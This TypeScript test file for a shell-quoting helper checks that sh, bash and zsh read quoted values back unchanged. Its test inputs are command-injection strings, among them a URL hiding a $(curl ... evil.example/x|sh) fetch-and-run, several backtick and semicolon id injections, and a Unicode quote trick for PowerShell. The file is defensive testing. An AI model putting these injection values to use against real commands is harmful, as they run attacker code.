/// <reference types="bun-types" />
import { describe, expect, test } from "bun:test";

import { shellQuote } from "./shell-quote.ts";

const hostile = [
	"https://farmer.example/api/mcp/acme$(curl -s https://evil.example/x|sh)",
	"acme`id`",
	"acme; id",
	"acme && id",
	"acme|id",
	"acme > /tmp/owned",
	"x'$(id)'",
	"x\\'$(id)\\'",
	// U+2019, which PowerShell ends a single-quoted string on.
	"x’$(id)’",
	'x"$(id)"',
	"$HOME ~ * ? [a] {a,b} !! # %",
	"a\nid",
	"",
];

describe("shellQuote", () => {
	test("leaves an ordinary URL as it is", () => {
		expect(shellQuote("https://farmer.example/api/mcp/acme-co")).toBe(
			"https://farmer.example/api/mcp/acme-co",
		);
		expect(shellQuote("http://localhost:3000/api/mcp/org_1")).toBe(
			"http://localhost:3000/api/mcp/org_1",
		);
	});

	test("single-quotes a value that holds shell syntax", () => {
		expect(shellQuote("https://h/api/mcp/acme$(curl -s e.example|sh)")).toBe(
			"'https://h/api/mcp/acme$(curl -s e.example|sh)'",
		);
		expect(shellQuote("")).toBe("''");
	});

	test("double-quotes quotes and backslashes alone, outside the quotes", () => {
		expect(shellQuote("a'b\\c’d")).toBe(`'a'"'"'b'"\\\\"'c'"’"'d'`);
	});

	// Every shell here must read the quoted word back as exactly the value:
	// any expansion or command substitution would change what it prints.
	for (const shell of ["sh", "bash", "zsh"]) {
		test.skipIf(Bun.which(shell) === null)(
			`${shell} reads each value back unchanged`,
			() => {
				for (const value of hostile) {
					const result = Bun.spawnSync([
						shell,
						"-c",
						`printf '%s' ${shellQuote(value)}`,
					]);
					expect(result.stdout.toString()).toBe(value);
				}
			},
		);
	}
});
